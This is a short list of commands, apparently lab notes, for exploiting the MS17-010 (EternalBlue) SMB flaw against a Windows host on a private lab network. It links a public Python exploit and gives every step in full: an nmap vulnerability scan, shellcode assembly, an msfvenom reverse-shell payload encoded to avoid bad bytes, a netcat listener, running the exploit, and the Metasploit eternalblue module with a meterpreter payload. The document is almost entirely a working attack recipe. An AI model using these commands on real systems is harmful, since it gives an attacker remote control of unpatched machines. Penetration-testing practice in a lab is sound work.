Python exploit:

https://github.com/worawit/MS17-010/

Commands used:

tcpdump -nnttttAi eth1 -w eternalblue.pcap

nmap -p445 --script smb-vuln-* 192.168.56.102

nasm -f bin eternalblue_kshellcode_x86.asm

msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o meterpreterx86.bin EXITFUNC=thread LHOST=192.168.56.101 LPORT=4444 -b \x00\x0a\x0d

cat eternalblue_kshellcode_x86 meterpreterx86.bin > sc_x86.bin

nc -nlvp 4444

python eternalblue_exploit7.py 192.168.56.102 sc_x86.bin

msfconsole

search eternalblue

use exploit/windows/smb/ms17_010_eternalblue

set RHOST 192.168.56.102

set LHOST 192.168.56.101

set PAYLOAD windows/meterpreter/reverse_tcp

set VerifyArch false

exploit